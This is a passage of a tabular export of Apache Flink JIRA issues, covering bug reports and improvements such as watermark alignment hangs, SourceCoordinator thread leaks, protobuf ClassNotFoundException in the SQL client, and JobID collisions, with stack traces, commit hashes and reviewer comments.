<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,mapohl,mapohl,mapohl,23/Jun/23 15:51,05/Jul/23 15:52,04/Jun/24 20:41,05/Jul/23 15:52,1.16.2,1.17.1,1.18.0,,,,,,,,,,,,1.16.3,1.17.2,1.18.0,,,,Runtime / Coordination,Tests,,,0,pull-request-available,,,"The purpose of {{EmbeddedLeaderServiceTest.testConcurrentRevokeLeadershipAndShutdown}} is to check that there is no {{NullPointerException}} happening if the event processing happens after the shutdown of the {{EmbeddedExecutorService}} (see FLINK-11855).

But the concurrent execution is not handled properly. The test also succeeds if the close call happened before the shutdown (due to the multi-threaded nature of the test) which leaves us without the actual test scenario being tested.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed Jul 05 15:52:41 UTC 2023,,,,,,,,,,"0|z1iqvs:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"05/Jul/23 15:52;mapohl;master: 5dbbc695ed90241bc22d01d05f19e2bdfb4b1e0b
1.17: 067df7b9ce14067375adffcc05bab5513592d646
1.16: 56cb5442333413e7617b12e5796c806d64de62e9;;;",,,,,,,,,,,,,,,,,,,,,,
Watermark aggregation performance is poor when watermark alignment is enabled and parallelism is high,FLINK-32420,13541193,13542368,Sub-task,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,fanrui,fanrui,fanrui,23/Jun/23 15:28,13/Jul/23 16:38,04/Jun/24 20:41,12/Jul/23 10:43,1.17.1,,,,,,,,,,,,,,1.18.0,,,,,,Connectors / Common,,,,0,pull-request-available,,,"The [SourceCoordinator.WatermarkAggregator#aggregate|https://github.com/apache/flink/blob/274aa0debffaa57926c474f11e36be753b49cbc5/flink-runtime/src/main/java/org/apache/flink/runtime/source/coordinator/SourceCoordinator.java#L644] method will find the smallest watermark of all keys as the  aggregatedWatermark.

However, the time complexity of the aggregate method in a WatermarkAlignment updateInterval cycle is O(n*n),because:
 * Every subtask report a latest watermark to SourceCoordinator in a WatermarkAlignment updateInterval cycle
 * SourceCoordinator updates the smallest watermark from all subtasks for each reporting

In general, the key is subtaskIndex, so the number of key is parallelism. When the parallelism is high, the watermark aggregation performance  will be poor.
h1. Performance Test:

The parallelism is 10000, each subtask reports 20 watermarks, and the aggregate method takes 18.921s. Almost every round takes 950 ms.
 * If the watermarkAlignment updateInterval is 1s, SourceCoordinator will be very busy.
 * If it's less than 1s, the Watermark aggregation will be delayed

I have finished the POC for performance improvement, and reduced Watermark aggregation time per watermarkAlignment updateInterval cycle from 950 ms to 6 ms.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"13/Jul/23 15:21;pnowojski;Screenshot 2023-07-13 at 17.19.11.png;https://issues.apache.org/jira/secure/attachment/13061324/Screenshot+2023-07-13+at+17.19.11.png","13/Jul/23 15:21;pnowojski;Screenshot 2023-07-13 at 17.19.24.png;https://issues.apache.org/jira/secure/attachment/13061325/Screenshot+2023-07-13+at+17.19.24.png",,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Jul 13 15:31:29 UTC 2023,,,,,,,,,,"0|z1iqvk:",9223372036854775807,"This performance improvement would be good to mention in the release blog post. 

As proven by the micro benchmarks (screenshots attached in the ticket), with 5000 subtasks, the time to calculate the watermark alignment on the JobManager by a factor of 76x (7664%). Previously such large jobs where actually at large risk of overloading JobManager, now that's far less likely to happen.",,,,,,,,,,,,,,,,,,,"12/Jul/23 10:42;fanrui;Merged via: 354a8852766b16873b5fad972e4440c1eaa4c40a (master: 1.18);;;","13/Jul/23 15:22;pnowojski;Yeah... no need for further comments :) Thanks [~fanrui]

 !Screenshot 2023-07-13 at 17.19.11.png|width=600!  !Screenshot 2023-07-13 at 17.19.24.png|width=600! ;;;","13/Jul/23 15:31;fanrui;Thanks [~pnowojski] for update the performance change here;;;",,,,,,,,,,,,,,,,,,,,
Remove unused/obsolete classes,FLINK-32419,13541128,13432464,Sub-task,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,mapohl,mapohl,mapohl,23/Jun/23 07:28,06/Jul/23 18:40,04/Jun/24 20:41,06/Jul/23 18:40,,,,,,,,,,,,,,,1.18.0,,,,,,Runtime / Coordination,,,,0,pull-request-available,,,,,,,,,,,,,,,,,,,,FLINK-31851,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Jul 06 18:40:19 UTC 2023,,,,,,,,,,"0|z1iqh4:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"06/Jul/23 18:40;mapohl;master:
* 716aa11ad516e1619f979ee635cb53f2dbe28e1b
* df2747f31f09a1142a4ce5ab67ae4ffbd56d2f0e;;;",,,,,,,,,,,,,,,,,,,,,,
ClassNotFoundException when using flink-protobuf with sql-client,FLINK-32418,13541118,,Bug,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,m-kay,m-kay,m-kay,23/Jun/23 05:42,21/Feb/24 02:22,04/Jun/24 20:41,,1.16.2,,,,,,,,,,,,,,,,,,,,"Formats (JSON, Avro, Parquet, ORC, SequenceFile)",Table SQL / Client,,,0,pull-request-available,stale-assigned,,"When the protobuf format in the kafka connector is used via the sql-client it is not able to load the generated protobuf classes which are either passed via `-j /protobuf-classes.jar` or added in the script via ADD JAR '/protobuf-classes.jar'. The SHOW JARS command prints that the jar is loaded but when the protobuf classes are loaded a ClassNotFoundException occurs.

executed command:
{code:java}
sql-client.sh -f protobuf-table.sql -j /protobuf-classes.jar
{code}
protobuf-table.sql
{code:sql}
ADD JAR '/opt/sql-client/lib/flink-sql-connector-kafka-1.16.2.jar';
ADD JAR '/opt/sql-client/lib/flink-protobuf-1.16.2.jar';

SHOW JARS;

CREATE TABLE POSITIONS(id BIGINT) WITH (
      'connector' = 'kafka',
      'format' = 'protobuf',
      'topic' = 'protbuf-topic',
      'properties.bootstrap.servers' = 'kafka:9092',
      'properties.group.id' = 'flink-protobuf',
      'properties.security.protocol' = 'SASL_PLAINTEXT',
      'properties.sasl.mechanism' = 'SCRAM-SHA-512',
      'properties.sasl.jaas.config' = 'org.apache.kafka.common.security.scram.ScramLoginModule required username=""user"" password=""****"";',
      'scan.startup.mode' = 'earliest-offset',
      'protobuf.message-class-name' = 'com.example.protobuf.ProtoMessage',
      'protobuf.ignore-parse-errors' = 'true'
      );

SELECT * FROM POSITIONS;
{code}
exception in the log:
{code:java}
Caused by: java.lang.ClassNotFoundException: com.example.protobuf.ProtoMessage
        at java.base/jdk.internal.loader.BuiltinClassLoader.loadClass(Unknown Source)
        at java.base/jdk.internal.loader.ClassLoaders$AppClassLoader.loadClass(Unknown Source)
        at java.base/java.lang.ClassLoader.loadClass(Unknown Source)
        at java.base/java.lang.Class.forName0(Native Method)
        at java.base/java.lang.Class.forName(Unknown Source)
        at org.apache.flink.formats.protobuf.util.PbFormatUtils.getDescriptor(PbFormatUtils.java:89)
        ... 36 more
{code}
This also seems somehow related to FLINK-30318",,,,,,,,,,,,,,,,,,FLINK-34472,,,,,,,,FLINK-30318,,,,,,"29/Jun/23 12:00;m-kay;full-stacktrace.log;https://issues.apache.org/jira/secure/attachment/13060969/full-stacktrace.log",,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed Sep 20 22:35:04 UTC 2023,,,,,,,,,,"0|z1iqew:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"25/Jun/23 01:53;luoyuxia;I think `PbFormatUtils` should use passed userclassloader to load the class.;;;","29/Jun/23 12:01;m-kay;For the deserialisation this works correctly because the correct classloader is set in the context via the TemporaryClassLoaderContext. However this exception is thrown in a validation phase where the classloader is not even available from the context. I have added the [^full-stacktrace.log] to better see where the exception is coming from.;;;","01/Jul/23 04:04;libenchao;Agree with [~yuxia] , connectors and formats should use the classloader from the `DynamicTableFactory.Context`, instead of using thread local context classloader.;;;","19/Aug/23 22:34;flink-jira-bot;I am the [Flink Jira Bot|https://github.com/apache/flink-jira-bot/] and I help the community manage its development. I see this issue is assigned but has not received an update in 30 days, so it has been labeled ""stale-assigned"".
If you are still working on the issue, please remove the label and add a comment updating the community on your progress.  If this issue is waiting on feedback, please consider this a reminder to the committer/reviewer. Flink is a very active project, and so we appreciate your patience.
If you are no longer working on the issue, please unassign yourself so someone else may work on it.
;;;","21/Aug/23 04:35;m-kay;[~libenchao] Could you may have a look at the pull-request?;;;","21/Aug/23 04:56;libenchao;[~m-kay] Sorry that I missed this one, I'll try to give it a review in the following days, thanks for your patience.;;;","20/Sep/23 22:35;flink-jira-bot;I am the [Flink Jira Bot|https://github.com/apache/flink-jira-bot/] and I help the community manage its development. I see this issue is assigned but has not received an update in 30 days, so it has been labeled ""stale-assigned"".
If you are still working on the issue, please remove the label and add a comment updating the community on your progress.  If this issue is waiting on feedback, please consider this a reminder to the committer/reviewer. Flink is a very active project, and so we appreciate your patience.
If you are no longer working on the issue, please unassign yourself so someone else may work on it.
;;;",,,,,,,,,,,,,,,,
DynamicKafkaSource User Documentation,FLINK-32417,13541097,13537730,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,mason6345,mason6345,mason6345,22/Jun/23 22:52,26/Jan/24 03:31,04/Jun/24 20:41,25/Jan/24 21:56,kafka-3.1.0,,,,,,,,,,,,,,kafka-3.1.0,,,,,,Connectors / Kafka,,,,0,pull-request-available,,,Add user documentation for DynamicKafkaSource,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Jan 25 21:56:24 UTC 2024,,,,,,,,,,"0|z1iqa8:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"25/Jan/24 21:56;martijnvisser;Fixed in apache/flink-connector-kafka:main 4f30099135fe68e412b4fc18d34c085d654c471e;;;",,,,,,,,,,,,,,,,,,,,,,
Initial DynamicKafkaSource Implementation ,FLINK-32416,13541096,13537730,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,mason6345,mason6345,mason6345,22/Jun/23 22:51,19/Jan/24 08:14,04/Jun/24 20:41,17/Jan/24 20:56,kafka-3.1.0,,,,,,,,,,,,,,kafka-3.1.0,,,,,,Connectors / Kafka,,,,0,pull-request-available,,,Implementation that supports unbounded and bounded modes. With a default implementation of KafkaMetadataService,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed Jan 17 20:56:34 UTC 2024,,,,,,,,,,"0|z1iqa0:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"17/Jan/24 20:56;martijnvisser;Fixed in apache/flink-connector-kafka:main

initial implementation of DynamicKafkaSource with bounded/unbounded support and unit/integration tests eaeb7817788a2da6fed3d9433850e10499e91852

Fix flaky tests by ensuring test utilities produce records with consistency and cleanup notify no more splits to ensure it is sent cdfa328b5ec34d711ae2c9e93de6de7565fd1db6
;;;",,,,,,,,,,,,,,,,,,,,,,
Add maven wrapper to benchmark to avoid maven version issues,FLINK-32415,13541059,,Improvement,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,gaborgsomogyi,gaborgsomogyi,gaborgsomogyi,22/Jun/23 15:47,23/Jun/23 07:26,04/Jun/24 20:41,23/Jun/23 07:26,,,,,,,,,,,,,,,,,,,,,Benchmarks,,,,0,pull-request-available,,,"The actual code gives the following error:
{code:java}
[ERROR] Failed to execute goal net.alchim31.maven:scala-maven-plugin:4.4.0:add-source (scala-compile-first) on project benchmark: The plugin net.alchim31.maven:scala-maven-plugin:4.4.0 requires Maven version 3.3.9 -> [Help 1]
{code}
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Jun 23 07:26:21 UTC 2023,,,,,,,,,,"0|z1iq1s:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"23/Jun/23 07:26;gaborgsomogyi;62a1db5 on master.;;;",,,,,,,,,,,,,,,,,,,,,,
Watermark alignment will cause flink jobs to hang forever when any source subtask has no SourceSplit,FLINK-32414,13541048,13542635,Sub-task,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,fanrui,fanrui,fanrui,22/Jun/23 14:47,06/Jul/23 06:57,04/Jun/24 20:41,28/Jun/23 02:36,1.16.2,1.17.1,,,,,,,,,,,,,1.16.3,1.17.2,1.18.0,,,,Connectors / Common,,,,0,pull-request-available,,,"Watermark alignment will cause flink jobs to hang forever when any source subtask has no SourceSplit.
h1. Root cause:
 # [SourceOperator#emitLatestWatermark|https://github.com/apache/flink/blob/274aa0debffaa57926c474f11e36be753b49cbc5/flink-streaming-java/src/main/java/org/apache/flink/streaming/api/operators/SourceOperator.java#L504] reports the lastEmittedWatermark to SourceCoordinator
 # If one subtask has no SourceSplit, the lastEmittedWatermark will be the [Watermark.UNINITIALIZED.getTimestamp()|https://github.com/apache/flink/blob/274aa0debffaa57926c474f11e36be753b49cbc5/flink-streaming-java/src/main/java/org/apache/flink/streaming/api/operators/SourceOperator.java#L149] forever, it's Long.MIN_VALUE.
 # SourceCoordinator combines the watermark of all subtasks, and using the [minimum watermark|https://github.com/apache/flink/blob/274aa0debffaa57926c474f11e36be753b49cbc5/flink-runtime/src/main/java/org/apache/flink/runtime/source/coordinator/SourceCoordinator.java#L644] as the aggregated watermark.
 # Long.MIN_VALUE must be the minimum watermark, so the maxAllowedWatermark =  Long.MIN_VALUE + maxAllowedWatermarkDrift, and [SourceCoordinator will announce it to all subtasks.|https://github.com/apache/flink/blob/274aa0debffaa57926c474f11e36be753b49cbc5/flink-runtime/src/main/java/org/apache/flink/runtime/source/coordinator/SourceCoordinator.java#L168]
 # The maxAllowedWatermark is very small, so all source subtasks will hang forever

h1. How to reproduce?

When the kafka partition number is less than the parallelism of kafka source.

Here is a demo: [code link|https://github.com/1996fanrui/fanrui-learning/commit/24b707f7805b3a61a70df1c70c26f8e8a16b006b]
 * kafka partition is 1
 * The paralleslism is 2

 

!image-2023-06-22-22-43-59-671.png|width=1439,height=296!",,,,,,,,,,,,,,,,,,,,,FLINK-24441,,,,,,,,,,,"22/Jun/23 14:44;fanrui;image-2023-06-22-22-43-59-671.png;https://issues.apache.org/jira/secure/attachment/13060811/image-2023-06-22-22-43-59-671.png",,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed Jun 28 02:35:59 UTC 2023,,,,,,,,,,"0|z1ipzc:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"28/Jun/23 02:35;fanrui;master: 7b96d815c0d510ffad120e188179604300bdb2c6

1.17: 0bf6f532c0dc302e5d6675cb35defea713274eb7

1.16: 06d4c04324962826c47698d432fa5e839cb34889;;;",,,,,,,,,,,,,,,,,,,,,,
Add fallback error handler to DefaultLeaderElectionService,FLINK-32413,13541013,13432464,Sub-task,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,mapohl,mapohl,mapohl,22/Jun/23 10:47,26/Jun/23 09:48,04/Jun/24 20:41,26/Jun/23 09:48,,,,,,,,,,,,,,,1.18.0,,,,,,Runtime / Coordination,,,,0,pull-request-available,,,"The FLIP-285 work separated the driver lifecycle from the contender lifecycle. Now, a contender can be removed but the driver could still be running. Error could be produced on the driver's side. The {{DefaultLeaderElectionService}} would try to forward the error to the contender. With not contender being registered, the error would be swallowed.

We should add a fallback error handler for this specific case.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon Jun 26 09:48:05 UTC 2023,,,,,,,,,,"0|z1iprs:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"26/Jun/23 09:48;mapohl;master: 14480c8ce4f6cd8f0f918f33d5662b7c62be8933;;;",,,,,,,,,,,,,,,,,,,,,,
JobID collisions in FlinkSessionJob,FLINK-32412,13541002,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,fabiowanner,fabiowanner,fabiowanner,22/Jun/23 09:30,26/Jun/23 14:17,04/Jun/24 20:41,26/Jun/23 14:17,kubernetes-operator-1.5.0,,,,,,,,,,,,,,kubernetes-operator-1.6.0,,,,,,Kubernetes Operator,,,,0,pull-request-available,,,"From time to time we see {{JobId}} collisions in our deployments due to the low entropy of the generated {{{}JobId{}}}. The problem is that, although the {{uid}} from the k8s-resource (which is a UUID V4), only the {{hashCode}} of it will be used for the {{{}JobId{}}}. The {{hashCode}} is an integer, thus 32 bits. If we look at the birthday problem theorem we can expect a collision with a 50% chance with only 77000 random integers. 

In reality we seem to see the problem more often, but this could be because the {{uid}} might not be completely random, therefore increasing the chances if we just use parts of it.

We propose to at least use the complete 64 bits of the upper part of the {{{}JobId{}}}, where 5.1×10{^}9{^} IDs are needed for a collision chance of 50%. We could even argue that most probably 64 bit for the generation number is not needed and another 32 bit could be spent on the uid to increase the entropy of the {{JobId}} even further (This would mean the max generation would be 4,294,967,295).

Our suggestion for using 64 bits would be:
{code:java}
new JobID(
    UUID.fromString(Preconditions.checkNotNull(uid)).getMostSignificantBits(), 
    Preconditions.checkNotNull(generation)
);
{code}
Any thoughts on this? I would create a PR once we know how to proceed.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon Jun 26 14:17:38 UTC 2023,,,,,,,,,,"0|z1ippc:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"22/Jun/23 10:04;gyfora;I think this is a very good improvement. We just have to make sure to not break the existing jobs but since the JobId is recorded in the status I think we are good.;;;","22/Jun/23 10:14;fabiowanner;Ohh that's a very good point, I did not think about! I will try this out to be extra sure and then open a PR with the suggested solution! Thanks for the fast reply!;;;","26/Jun/23 14:17;gyfora;merged to main abf9d040ae58caf8313ca7b71049d6709fa26ea3;;;",,,,,,,,,,,,,,,,,,,,
SourceCoordinator thread leaks when job recovers from checkpoint,FLINK-32411,13540974,13542635,Sub-task,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,fanrui,fanrui,fanrui,22/Jun/23 03:21,06/Jul/23 06:57,04/Jun/24 20:41,29/Jun/23 02:30,1.16.2,1.17.1,,,,,,,,,,,,,1.16.3,1.17.2,1.18.0,,,,Connectors / Common,,,,0,pull-request-available,,,"SourceCoordinator thread leaks when job recovers from checkpoint, from the following figure, we can see:
 * 2 SourceCoordinator thread for slow SlowNumberSequenceSource
 * 2 SourceCoordinator thread for slow FastNumberSequenceSource 

!image-2023-06-22-11-12-35-747.png|width=889,height=225!
h1. Root cause:
 # When initialize the ExecutionJobVertex of source, RecreateOnResetOperatorCoordinator will create the SourceCoordinator. [code link|https://github.com/apache/flink/blob/50952050057b1655e6a81e844cefa377db66d277/flink-runtime/src/main/java/org/apache/flink/runtime/operators/coordination/RecreateOnResetOperatorCoordinator.java#L60]
 # When job recovers from checkpoint,  [RecreateOnResetOperatorCoordinator#resetToCheckpoint|https://github.com/apache/flink/blob/50952050057b1655e6a81e844cefa377db66d277/flink-runtime/src/main/java/org/apache/flink/runtime/operators/coordination/RecreateOnResetOperatorCoordinator.java#L120] will close the old coordinator, and create a new coordinator. 
 # The [SourceCoordinator#close|https://github.com/apache/flink/blob/50952050057b1655e6a81e844cefa377db66d277/flink-runtime/src/main/java/org/apache/flink/runtime/source/coordinator/SourceCoordinator.java#L271] just close the SourceCoordinatorContext after coordinator is started, so the SourceCoordinatorContext of old coordinator won't be closed.
 # The SourceCoordinatorContext create some threads in its [constructor|https://github.com/apache/flink/blob/50952050057b1655e6a81e844cefa377db66d277/flink-runtime/src/main/java/org/apache/flink/runtime/source/coordinator/SourceCoordinatorContext.java#L118], so it should be closed even if the SourceCoordinator isn't started.

 

The call stack about creating SourceCoordinator:
{code:java}
// Create the first SourceCoordinator
""jobmanager-io-thread-1@6168"" daemon prio=5 tid=0x44 nid=NA runnable
  java.lang.Thread.State: RUNNABLE
      at org.apache.flink.runtime.source.coordinator.SourceCoordinator.<init>(SourceCoordinator.java:142)
      at org.apache.flink.runtime.source.coordinator.SourceCoordinatorProvider.getCoordinator(SourceCoordinatorProvider.java:92)
      at org.apache.flink.runtime.operators.coordination.RecreateOnResetOperatorCoordinator$DeferrableCoordinator.createNewInternalCoordinator(RecreateOnResetOperatorCoordinator.java:339)
      - locked <0x1f02> (a org.apache.flink.runtime.operators.coordination.RecreateOnResetOperatorCoordinator$DeferrableCoordinator)
      at org.apache.flink.runtime.operators.coordination.RecreateOnResetOperatorCoordinator.<init>(RecreateOnResetOperatorCoordinator.java:60)
      at org.apache.flink.runtime.operators.coordination.RecreateOnResetOperatorCoordinator.<init>(RecreateOnResetOperatorCoordinator.java:43)
      at org.apache.flink.runtime.operators.coordination.RecreateOnResetOperatorCoordinator$Provider.create(RecreateOnResetOperatorCoordinator.java:202)
      at org.apache.flink.runtime.operators.coordination.RecreateOnResetOperatorCoordinator$Provider.create(RecreateOnResetOperatorCoordinator.java:196)
      at org.apache.flink.runtime.operators.coordination.OperatorCoordinatorHolder.create(OperatorCoordinatorHolder.java:534)
      at org.apache.flink.runtime.operators.coordination.OperatorCoordinatorHolder.create(OperatorCoordinatorHolder.java:497)
      at org.apache.flink.runtime.executiongraph.ExecutionJobVertex.createOperatorCoordinatorHolder(ExecutionJobVertex.java:286)
      at org.apache.flink.runtime.executiongraph.ExecutionJobVertex.initialize(ExecutionJobVertex.java:223)
      at org.apache.flink.runtime.executiongraph.DefaultExecutionGraph.initializeJobVertex(DefaultExecutionGraph.java:912)
      at org.apache.flink.runtime.executiongraph.ExecutionGraph.initializeJobVertex(ExecutionGraph.java:218)
      at org.apache.flink.runtime.executiongraph.DefaultExecutionGraph.initializeJobVertices(DefaultExecutionGraph.java:894)
      at org.apache.flink.runtime.executiongraph.DefaultExecutionGraph.attachJobGraph(DefaultExecutionGraph.java:850)
      at org.apache.flink.runtime.executiongraph.DefaultExecutionGraphBuilder.buildGraph(DefaultExecutionGraphBuilder.java:207)
      at org.apache.flink.runtime.scheduler.DefaultExecutionGraphFactory.createAndRestoreExecutionGraph(DefaultExecutionGraphFactory.java:163)
      at org.apache.flink.runtime.scheduler.SchedulerBase.createAndRestoreExecutionGraph(SchedulerBase.java:366)
      at org.apache.flink.runtime.scheduler.SchedulerBase.<init>(SchedulerBase.java:210)
      at org.apache.flink.runtime.scheduler.DefaultScheduler.<init>(DefaultScheduler.java:140)
      at org.apache.flink.runtime.scheduler.DefaultSchedulerFactory.createInstance(DefaultSchedulerFactory.java:156)
      at org.apache.flink.runtime.jobmaster.DefaultSlotPoolServiceSchedulerFactory.createScheduler(DefaultSlotPoolServiceSchedulerFactory.java:122)
      at org.apache.flink.runtime.jobmaster.JobMaster.createScheduler(JobMaster.java:378)
      at org.apache.flink.runtime.jobmaster.JobMaster.<init>(JobMaster.java:355)
      at org.apache.flink.runtime.jobmaster.factories.DefaultJobMasterServiceFactory.internalCreateJobMasterService(DefaultJobMasterServiceFactory.java:128)
      at org.apache.flink.runtime.jobmaster.factories.DefaultJobMasterServiceFactory.lambda$createJobMasterService$0(DefaultJobMasterServiceFactory.java:100)
      at org.apache.flink.runtime.jobmaster.factories.DefaultJobMasterServiceFactory$$Lambda$751.371794887.get(Unknown Source:-1)
      at org.apache.flink.util.function.FunctionUtils.lambda$uncheckedSupplier$4(FunctionUtils.java:112)
      at org.apache.flink.util.function.FunctionUtils$$Lambda$752.1103993612.get(Unknown Source:-1)
      at java.util.concurrent.CompletableFuture$AsyncSupply.run$$$capture(CompletableFuture.java:1590)
      at java.util.concurrent.CompletableFuture$AsyncSupply.run(CompletableFuture.java:-1)
      at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)
      at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)
      at java.lang.Thread.run(Thread.java:748)






// Create the second SourceCoordinator when recovers from checkpoint
""Thread-7@8239"" daemon prio=5 tid=0x4f nid=NA runnable
  java.lang.Thread.State: RUNNABLE
      at org.apache.flink.runtime.source.coordinator.SourceCoordinator.<init>(SourceCoordinator.java:142)
      at org.apache.flink.runtime.source.coordinator.SourceCoordinatorProvider.getCoordinator(SourceCoordinatorProvider.java:92)
      at org.apache.flink.runtime.operators.coordination.RecreateOnResetOperatorCoordinator$DeferrableCoordinator.createNewInternalCoordinator(RecreateOnResetOperatorCoordinator.java:339)
      - locked <0x2063> (a org.apache.flink.runtime.operators.coordination.RecreateOnResetOperatorCoordinator$DeferrableCoordinator)
      at org.apache.flink.runtime.operators.coordination.RecreateOnResetOperatorCoordinator.lambda$resetToCheckpoint$6(RecreateOnResetOperatorCoordinator.java:150)
      at org.apache.flink.runtime.operators.coordination.RecreateOnResetOperatorCoordinator$$Lambda$900.2091837632.accept(Unknown Source:-1)
      at java.util.concurrent.CompletableFuture.uniWhenComplete(CompletableFuture.java:760)
      at java.util.concurrent.CompletableFuture$UniWhenComplete.tryFire(CompletableFuture.java:736)
      at java.util.concurrent.CompletableFuture.postComplete(CompletableFuture.java:474)
      at java.util.concurrent.CompletableFuture.complete(CompletableFuture.java:1962)
      at org.apache.flink.runtime.operators.coordination.ComponentClosingUtils.lambda$closeAsyncWithTimeout$0(ComponentClosingUtils.java:77)
      at org.apache.flink.runtime.operators.coordination.ComponentClosingUtils$$Lambda$895.1145152008.run(Unknown Source:-1)
      at java.lang.Thread.run(Thread.java:748){code}
 ",,,,,,,,,,,,,,,,,,,,,,,FLINK-32478,FLINK-32487,,FLINK-32316,,,,,,"22/Jun/23 03:12;fanrui;image-2023-06-22-11-12-35-747.png;https://issues.apache.org/jira/secure/attachment/13060796/image-2023-06-22-11-12-35-747.png",,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Jun 29 02:30:36 UTC 2023,,,,,,,,,,"0|z1ipj4:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"29/Jun/23 02:30;fanrui;Merged

<master: 1.18> 876b1ec262f6c442e4bf87c9a5f83811e90e2805

1.17: a828cd275b55c566ede4ba9878a9c1d2b5997d6e

1.16: 9fc79ac2c3a96e7edb2b911bdc7b6ceaf0ea731f;;;",,,,,,,,,,,,,,,,,,,,,,
Allocate hash-based collections with sufficient capacity for expected size,FLINK-32410,13540904,,Improvement,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Done,srichter,srichter,srichter,21/Jun/23 13:57,24/Jan/24 14:35,04/Jun/24 20:41,24/Jan/24 14:35,,,,,,,,,,,,,,,1.18.0,,,,,,,,,,0,pull-request-available,stale-assigned,,"The JDK API to create hash-based collections for a certain capacity is arguable misleading because it doesn't size the collections to ""hold a specific number of items"" like you'd expect it would. Instead it sizes it to hold load-factor% of the specified number.

For the common pattern to allocate a hash-based collection with the size of expected elements to avoid rehashes, this means that a rehash is essentially guaranteed.

